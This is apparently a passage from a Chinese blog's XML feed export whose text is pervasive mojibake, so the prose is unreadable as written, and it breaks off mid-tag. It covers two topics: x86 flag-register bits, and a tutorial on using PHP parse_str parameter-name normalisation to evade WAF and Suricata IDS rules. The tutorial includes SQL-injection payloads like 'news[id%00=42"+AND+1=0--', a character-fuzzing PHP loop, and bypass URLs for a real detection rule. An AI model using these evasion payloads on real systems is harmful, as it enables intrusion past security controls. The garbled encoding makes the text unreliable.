è¿ç®—ç»“æœä¸­â€œ1â€çš„ä¸ªæ•°çš„å¥‡å¶æ€§ã€‚å¦‚æœâ€œ1â€çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œåˆ™PFçš„å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ </p><p>åˆ©ç”¨PFå¯è¿›è¡Œå¥‡å¶æ ¡éªŒæ£€æŸ¥ï¼Œæˆ–äº§ç”Ÿå¥‡å¶æ ¡éªŒä½ã€‚åœ¨æ•°æ®ä¼ é€è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†æä¾›ä¼ é€çš„å¯é æ€§ï¼Œå¦‚æœé‡‡ç”¨å¥‡å¶æ ¡éªŒçš„æ–¹æ³•ï¼Œå°±å¯ä½¿ç”¨è¯¥æ ‡å¿—ä½ã€‚ </p><h3 id="3ã€è¾…åŠ©è¿›ä½æ ‡å¿—AF-Auxiliary-Carry-Flag"><a href="#3ã€è¾…åŠ©è¿›ä½æ ‡å¿—AF-Auxiliary-Carry-Flag" class="headerlink" title="3ã€è¾…åŠ©è¿›ä½æ ‡å¿—AF(Auxiliary Carry Flag)"></a>3ã€è¾…åŠ©è¿›ä½æ ‡å¿—AF(Auxiliary Carry Flag)</h3><p>åœ¨å‘ç”Ÿä¸‹åˆ—æƒ…å†µæ—¶ï¼Œè¾…åŠ©è¿›ä½æ ‡å¿—AFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ï¼š </p><ol><li>åœ¨å­—æ“ä½œæ—¶ï¼Œå‘ç”Ÿä½å­—èŠ‚å‘é«˜å­—èŠ‚è¿›ä½æˆ–å€Ÿä½æ—¶ï¼› </li><li>åœ¨å­—èŠ‚æ“ä½œæ—¶ï¼Œå‘ç”Ÿä½4ä½å‘é«˜4ä½è¿›ä½æˆ–å€Ÿä½æ—¶ã€‚</li></ol><p>å¯¹ä»¥ä¸Š6ä¸ªè¿ç®—ç»“æœæ ‡å¿—ä½ï¼Œåœ¨ä¸€èˆ¬ç¼–ç¨‹æƒ…å†µä¸‹ï¼Œæ ‡å¿—ä½CFã€ZFã€SFå’ŒOFçš„ä½¿ç”¨é¢‘ç‡è¾ƒé«˜ï¼Œè€Œæ ‡å¿—ä½PFå’ŒAFçš„ä½¿ç”¨é¢‘ç‡è¾ƒä½ã€‚ </p><h3 id="4ã€é›¶æ ‡å¿—ZF-Zero-Flag"><a href="#4ã€é›¶æ ‡å¿—ZF-Zero-Flag" class="headerlink" title="4ã€é›¶æ ‡å¿—ZF(Zero Flag)"></a>4ã€é›¶æ ‡å¿—ZF(Zero Flag)</h3><p>é›¶æ ‡å¿—ZFç”¨æ¥åæ˜ è¿ç®—ç»“æœæ˜¯å¦ä¸º0ã€‚å¦‚æœè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚åœ¨åˆ¤æ–­è¿ç®—ç»“æœæ˜¯å¦ä¸º0æ—¶ï¼Œå¯ä½¿ç”¨æ­¤æ ‡å¿—ä½ã€‚ </p><h3 id="5ã€ç¬¦å·æ ‡å¿—SF-Sign-Flag"><a href="#5ã€ç¬¦å·æ ‡å¿—SF-Sign-Flag" class="headerlink" title="5ã€ç¬¦å·æ ‡å¿—SF(Sign Flag)"></a>5ã€ç¬¦å·æ ‡å¿—SF(Sign Flag)</h3><p>ç¬¦å·æ ‡å¿—SFç”¨æ¥åæ˜ è¿ç®—ç»“æœçš„ç¬¦å·ä½ï¼Œå®ƒä¸è¿ç®—ç»“æœçš„æœ€é«˜ä½ç›¸åŒã€‚åœ¨å¾®æœºç³»ç»Ÿä¸­ï¼Œæœ‰ç¬¦å·æ•°é‡‡ç”¨ç è¡¨ç¤ºæ³•ï¼Œæ‰€ä»¥ï¼ŒSFä¹Ÿå°±åæ˜ è¿ç®—ç»“æœçš„æ­£è´Ÿå·ã€‚è¿ç®—ç»“æœä¸ºæ­£æ•°æ—¶ï¼ŒSFçš„å€¼ä¸º0ï¼Œå¦åˆ™å…¶å€¼ä¸º1ã€‚ </p><h3 id="6ã€æº¢å‡ºæ ‡å¿—OF-Overflow-Flag"><a href="#6ã€æº¢å‡ºæ ‡å¿—OF-Overflow-Flag" class="headerlink" title="6ã€æº¢å‡ºæ ‡å¿—OF(Overflow Flag)"></a>6ã€æº¢å‡ºæ ‡å¿—OF(Overflow Flag)</h3><p>æº¢å‡ºæ ‡å¿—OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡ºã€‚å¦‚æœè¿ç®—ç»“æœè¶…è¿‡å½“å‰è¿ç®—ä½æ•°æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œåˆ™ç§°ä¸ºæº¢å‡ºï¼ŒOFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™ï¼ŒOFçš„å€¼è¢«æ¸…ä¸º0ã€‚ â€œ</p><p>æº¢å‡ºâ€å’Œâ€œè¿›ä½â€æ˜¯ä¸¤ä¸ªä¸åŒå«ä¹‰çš„æ¦‚å¿µï¼Œä¸è¦æ··æ·†ã€‚</p><h2 id="äºŒã€çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½"><a href="#äºŒã€çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½" class="headerlink" title="äºŒã€çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½"></a>äºŒã€çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½</h2><p>çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½æ˜¯ç”¨æ¥æ§åˆ¶CPUæ“ä½œçš„ï¼Œå®ƒä»¬è¦é€šè¿‡ä¸“é—¨çš„æŒ‡ä»¤æ‰èƒ½ä½¿ä¹‹å‘ç”Ÿæ”¹å˜ã€‚ </p><h2 id="1ã€è¿½è¸ªæ ‡å¿—TF-Trap-Flag"><a href="#1ã€è¿½è¸ªæ ‡å¿—TF-Trap-Flag" class="headerlink" title="1ã€è¿½è¸ªæ ‡å¿—TF(Trap Flag)"></a>1ã€è¿½è¸ªæ ‡å¿—TF(Trap Flag)</h2><p>å½“è¿½è¸ªæ ‡å¿—TFè¢«ç½®ä¸º1æ—¶ï¼ŒCPUè¿›å…¥å•æ­¥æ‰§è¡Œæ–¹å¼ï¼Œå³æ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼Œäº§ç”Ÿä¸€ä¸ªå•æ­¥ä¸­æ–­è¯·æ±‚ã€‚è¿™ç§æ–¹å¼ä¸»è¦ç”¨äºç¨‹åºçš„è°ƒè¯•ã€‚ æŒ‡ä»¤ç³»ç»Ÿä¸­æ²¡æœ‰ä¸“é—¨çš„æŒ‡ä»¤æ¥æ”¹å˜æ ‡å¿—ä½TFçš„å€¼ï¼Œä½†ç¨‹åºå‘˜å¯ç”¨å…¶å®ƒåŠæ³•æ¥æ”¹å˜å…¶å€¼ã€‚ </p><h3 id="2ã€ä¸­æ–­å…è®¸æ ‡å¿—IF-Interrupt-enable-Flag"><a href="#2ã€ä¸­æ–­å…è®¸æ ‡å¿—IF-Interrupt-enable-Flag" class="headerlink" title="2ã€ä¸­æ–­å…è®¸æ ‡å¿—IF(Interrupt-enable Flag)"></a>2ã€ä¸­æ–­å…è®¸æ ‡å¿—IF(Interrupt-enable Flag)</h3><p>ä¸­æ–­å…è®¸æ ‡å¿—IFæ˜¯ç”¨æ¥å†³å®šCPUæ˜¯å¦å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ã€‚ ä½†ä¸ç®¡è¯¥æ ‡å¿—ä¸ºä½•å€¼ï¼ŒCPUéƒ½å¿…é¡»å“åº”CPUå¤–éƒ¨çš„ä¸å¯å±è”½ä¸­æ–­æ‰€å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ï¼Œä»¥åŠCPUå†…éƒ¨äº§ç”Ÿçš„ä¸­æ–­è¯·æ±‚ã€‚ å…·ä½“è§„å®šå¦‚ä¸‹ï¼š </p><ol><li>å½“IF=1æ—¶ï¼ŒCPUå¯ä»¥å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ï¼› </li><li>å½“IF=0æ—¶ï¼ŒCPUä¸å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ã€‚ CPUçš„æŒ‡ä»¤ç³»ç»Ÿä¸­ä¹Ÿæœ‰ä¸“é—¨çš„æŒ‡ä»¤æ¥æ”¹å˜æ ‡å¿—ä½IFçš„å€¼ã€‚</li></ol><h3 id="3ã€æ–¹å‘æ ‡å¿—DF-Direction-Flag"><a href="#3ã€æ–¹å‘æ ‡å¿—DF-Direction-Flag" class="headerlink" title="3ã€æ–¹å‘æ ‡å¿—DF(Direction Flag)"></a>3ã€æ–¹å‘æ ‡å¿—DF(Direction Flag)</h3><p>æ–¹å‘æ ‡å¿—DFç”¨æ¥å†³å®šåœ¨ä¸²æ“ä½œæŒ‡ä»¤æ‰§è¡Œæ—¶æœ‰å…³æŒ‡é’ˆå¯„å­˜å™¨å‘ç”Ÿè°ƒæ•´çš„æ–¹å‘ã€‚ åœ¨å¾®æœºçš„æŒ‡ä»¤ç³»ç»Ÿä¸­ï¼Œè¿˜æä¾›äº†ä¸“é—¨çš„æŒ‡ä»¤æ¥æ”¹å˜æ ‡å¿—ä½DFçš„å€¼ã€‚ </p><h2 id="ä¸‰ã€32ä½æ ‡å¿—å¯„å­˜å™¨å¢åŠ çš„æ ‡å¿—ä½"><a href="#ä¸‰ã€32ä½æ ‡å¿—å¯„å­˜å™¨å¢åŠ çš„æ ‡å¿—ä½" class="headerlink" title="ä¸‰ã€32ä½æ ‡å¿—å¯„å­˜å™¨å¢åŠ çš„æ ‡å¿—ä½"></a>ä¸‰ã€32ä½æ ‡å¿—å¯„å­˜å™¨å¢åŠ çš„æ ‡å¿—ä½</h2><h3 id="1ã€I-Oç‰¹æƒæ ‡å¿—IOPL-I-O-Privilege-Level"><a href="#1ã€I-Oç‰¹æƒæ ‡å¿—IOPL-I-O-Privilege-Level" class="headerlink" title="1ã€I/Oç‰¹æƒæ ‡å¿—IOPL(I/O Privilege Level)"></a>1ã€I/Oç‰¹æƒæ ‡å¿—IOPL(I/O Privilege Level)</h3><p>I/Oç‰¹æƒæ ‡å¿—ç”¨ä¸¤ä½äºŒè¿›åˆ¶ä½æ¥è¡¨ç¤ºï¼Œä¹Ÿç§°ä¸ºI/Oç‰¹æƒçº§å­—æ®µã€‚è¯¥å­—æ®µæŒ‡å®šäº†è¦æ±‚æ‰§è¡ŒI/OæŒ‡ä»¤çš„ç‰¹æƒçº§ã€‚ å¦‚æœå½“å‰çš„ç‰¹æƒçº§åˆ«åœ¨æ•°å€¼ä¸Šå°äºç­‰äºIOPLçš„å€¼ï¼Œé‚£ä¹ˆï¼Œè¯¥I/OæŒ‡ä»¤å¯æ‰§è¡Œï¼Œå¦åˆ™å°†å‘ç”Ÿä¸€ä¸ªä¿æŠ¤å¼‚å¸¸ã€‚ </p><h3 id="2ã€åµŒå¥—ä»»åŠ¡æ ‡å¿—NT-Nested-Task"><a href="#2ã€åµŒå¥—ä»»åŠ¡æ ‡å¿—NT-Nested-Task" class="headerlink" title="2ã€åµŒå¥—ä»»åŠ¡æ ‡å¿—NT(Nested Task)"></a>2ã€åµŒå¥—ä»»åŠ¡æ ‡å¿—NT(Nested Task)</h3><p>åµŒå¥—ä»»åŠ¡æ ‡å¿—NTç”¨æ¥æ§åˆ¶ä¸­æ–­è¿”å›æŒ‡ä»¤IRETçš„æ‰§è¡Œã€‚å…·ä½“è§„å®šå¦‚ä¸‹ï¼š </p><ol><li>å½“NT=0ï¼Œç”¨å †æ ˆä¸­ä¿å­˜çš„å€¼æ¢å¤EFLAGSã€CSå’ŒEIPï¼Œæ‰§è¡Œå¸¸è§„çš„ä¸­æ–­è¿”å›æ“ä½œï¼› </li><li>å½“NT=1ï¼Œé€šè¿‡ä»»åŠ¡è½¬æ¢å®ç°ä¸­æ–­è¿”å›ã€‚</li></ol><h3 id="3ã€é‡å¯åŠ¨æ ‡å¿—RF-Restart-Flag"><a href="#3ã€é‡å¯åŠ¨æ ‡å¿—RF-Restart-Flag" class="headerlink" title="3ã€é‡å¯åŠ¨æ ‡å¿—RF(Restart Flag)"></a>3ã€é‡å¯åŠ¨æ ‡å¿—RF(Restart Flag)</h3><p>é‡å¯åŠ¨æ ‡å¿—RFç”¨æ¥æ§åˆ¶æ˜¯å¦æ¥å—è°ƒè¯•æ•…éšœã€‚è§„å®šï¼šRF=0æ—¶ï¼Œè¡¨ç¤ºâ€œæ¥å—â€è°ƒè¯•æ•…éšœï¼Œå¦åˆ™æ‹’ç»ä¹‹ã€‚ åœ¨æˆåŠŸæ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤åï¼Œå¤„ç†æœºæŠŠRFç½®ä¸º0ï¼Œå½“æ¥å—åˆ°ä¸€ä¸ªéè°ƒè¯•æ•…éšœæ—¶ï¼Œå¤„ç†æœºå°±æŠŠå®ƒç½®ä¸º1ã€‚ </p><h3 id="4ã€è™šæ‹Ÿ8086æ–¹å¼æ ‡å¿—VM-Virtual-8086-Mode"><a href="#4ã€è™šæ‹Ÿ8086æ–¹å¼æ ‡å¿—VM-Virtual-8086-Mode" class="headerlink" title="4ã€è™šæ‹Ÿ8086æ–¹å¼æ ‡å¿—VM(Virtual 8086 Mode)"></a>4ã€è™šæ‹Ÿ8086æ–¹å¼æ ‡å¿—VM(Virtual 8086 Mode)</h3><p>å¦‚æœè¯¥æ ‡å¿—çš„å€¼ä¸º1ï¼Œåˆ™è¡¨ç¤ºå¤„ç†æœºå¤„äºè™šæ‹Ÿçš„8086æ–¹å¼ä¸‹çš„å·¥ä½œçŠ¶æ€ï¼Œå¦åˆ™ï¼Œå¤„ç†æœºå¤„äºä¸€èˆ¬ä¿æŠ¤æ–¹å¼ä¸‹çš„å·¥ä½œçŠ¶æ€ã€‚ </p>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</title>
      <link href="/2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/"/>
      <url>/2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass"><a href="#åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass" class="headerlink" title="åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass"></a>åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</h2><p>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>news<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">%</span><span class="token number">20</span>news<span class="token punctuation">[</span>id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">42</span>"<span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</p><p>HPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><ol><li>åˆ é™¤ç©ºç™½ç¬¦</li><li>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</li></ol><p>ä¾‹å¦‚ï¼š</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>é€šè¿‡ä»¥ä¸‹è¿™ä¸ªç¤ºä¾‹ï¼Œä½ å¯ä»¥æ›´ç›´è§‚çš„çœ‹åˆ°parser_strå‡½æ•°å¦‚ä½•å¤„ç†å­—ç¬¦ä¸²ï¼š</p><p><img src="https://s3.ax1x.com/2021/03/03/6EyIW4.gif" alt="6EyIW4.gif"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span>            <span class="token string double-quoted-string">"{chr}foo_bar"</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"foo{chr}bar"</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"foo_bar{chr}"</span>        <span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">255</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token variable">$arg</span><span class="token operator">.</span><span class="token string double-quoted-string">"] check "</span><span class="token operator">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"{chr}"</span><span class="token punctuation">,</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"=bla"</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* yes... I've added a sleep time on each loop just for                 the scenic effect :) like that movie with unrealistic                 brute-force where the password are obtained                 one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ                 */</span>                <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"foo_bar"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>                    <span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token operator">.</span><span class="token string double-quoted-string">" -&gt; "</span><span class="token operator">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" ("</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")\n"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2021/03/03/6EyHyR.gif" alt="6EyHyR.gif"></p><p>parse_strå‡½æ•°é€šå¸¸è¢«è‡ªåŠ¨åº”ç”¨äºgetã€postè¯·æ±‚å’Œcookieä¸­ã€‚å¦‚æœä½ çš„WebæœåŠ¡å™¨æ¥å—å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦çš„å‚æ•°åï¼Œé‚£ä¹ˆä¹Ÿä¼šå‘ç”Ÿç±»ä¼¼çš„æƒ…å†µã€‚å¦‚ä¸Šä»£ç æ‰€ç¤ºï¼Œæˆ‘è¿›è¡Œäº†å¤šæ¬¡å¾ªç¯ï¼Œæšä¸¾äº†å‚æ•°åä¸‰ä¸ªä½ç½®çš„0åˆ°255ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼Œçœ‹çœ‹è§£æå‡½æ•°åˆ°åº•æ˜¯å¦‚ä½•å¤„ç†è¿™äº›ç‰¹æ®Šå­—ç¬¦çš„ã€‚ç»“æœå¦‚ä¸‹ï¼š</p><ol><li><p>[1st]foo_bar  </p></li><li><p>foo[2nd]bar    </p></li><li><p>foo_bar[3rd]</p></li></ol><p><img src="https://s3.ax1x.com/2021/03/03/6EyLex.jpg" alt="6EyLex.jpg"></p><p><img src="https://s3.ax1x.com/2021/03/03/6EyxYD.jpg" alt="6EyxYD.jpg"></p><p>åœ¨ä¸Šè¿°æ–¹æ¡ˆä¸­ï¼Œfoo%20barå’Œfoo+barç­‰æ•ˆï¼Œå‡è§£æä¸ºfoo barã€‚</p><h2 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h2><p>ä¹Ÿè®¸ä½ ä¹Ÿå¬è¿‡è¿™æ¬¾è½¯ä»¶ï¼ŒSuricataæ˜¯ä¸€ä¸ªâ€œå¼€æºã€æˆç†Ÿã€å¿«é€Ÿã€å¼ºå¤§çš„ç½‘ç»œå¨èƒæ£€æµ‹å¼•æ“â€ï¼Œå®ƒçš„å¼•æ“èƒ½å¤Ÿè¿›è¡Œå®æ—¶å…¥ä¾µæ£€æµ‹ï¼ˆIDSï¼‰ã€å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼ˆIPSï¼‰ã€ç½‘ç»œå®‰å…¨ç›‘æ§ï¼ˆNSMï¼‰å’Œç¦»çº¿æµé‡åŒ…å¤„ç†ã€‚</p><p>åœ¨Suricataä¸­ä½ å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªHTTPæµé‡çš„æ£€æµ‹è§„åˆ™ã€‚å‡è®¾ä½ æœ‰è¿™æ ·ä¸€ä¸ªè§„åˆ™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http any any -<span class="token operator">&gt;</span> <span class="token variable">$HOME_NET</span> any <span class="token punctuation">(</span><span class="token punctuation">\</span>    msg: <span class="token string">"Block SQLi"</span><span class="token punctuation">;</span> flow:established,to_server<span class="token punctuation">;</span><span class="token punctuation">\</span>    content: <span class="token string">"POST"</span><span class="token punctuation">;</span> http_method<span class="token punctuation">;</span><span class="token punctuation">\</span>    pcre: <span class="token string">"/news_id=[^0-9]+/Pi"</span><span class="token punctuation">;</span><span class="token punctuation">\</span>    sid:1234567<span class="token punctuation">;</span><span class="token punctuation">\</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç®€å•æ¥è¯´ï¼Œä¸Šè¿°è§„åˆ™ä¼šæ£€æŸ¥news_idçš„å€¼æ˜¯å¦æ˜¯æ•°å­—ã€‚é‚£ä¹ˆæ ¹æ®ä¸Šè¿°çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„ç»•è¿‡é˜²å¾¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>news<span class="token punctuation">[</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span><span class="token string single-quoted-string">'/?news%5bid=1%22+AND+1=1--'</span><span class="token operator">/</span><span class="token operator">?</span>news_id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡åœ¨Googleå’ŒGithubä¸Šè¿›è¡Œæœç´¢ï¼Œæˆ‘å‘ç°æœ‰å¾ˆå¤šå…³äºSuricataè§„åˆ™å¯ä»¥é€šè¿‡æ›¿æ¢ä¸‹åˆ’çº¿æˆ–æ’å…¥ç©ºå­—ç¬¦æ¥ç»•è¿‡ã€‚ä¸€ä¸ªçœŸå®çš„ä¾‹å­ï¼š<a href="https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805">https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http <span class="token variable">$HOME_NET</span> any -<span class="token operator">&gt;</span> <span class="token variable">$EXTERNAL_NET</span> any <span class="token punctuation">(</span>msg:<span class="token string">"ET CURRENT_EVENTS Sakura exploit kit exploit download request /view.php"</span><span class="token punctuation">;</span> flow:established,to_server<span class="token punctuation">;</span> content:<span class="token string">"/view.php?i="</span><span class="token punctuation">;</span> http_uri<span class="token punctuation">;</span> fast_pattern:only<span class="token punctuation">;</span> pcre:<span class="token string">"//view.php?i=\d&amp;key=[0-9a-f]{32}$/U"</span><span class="token punctuation">;</span> classtype:trojan-activity<span class="token punctuation">;</span> sid:2015678<span class="token punctuation">;</span> rev:2<span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šè¿°è§„åˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>view<span class="token operator">.</span>php<span class="token operator">?</span>i<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">20</span>key<span class="token operator">=</span>d3b07384d113edec49eaa6238ad5ff00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ç„¶ï¼Œè¿™æ¡è§„åˆ™äº¤æ¢å‚æ•°ä½ç½®å³å¯ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>view<span class="token operator">.</span>php<span class="token operator">?</span>key<span class="token 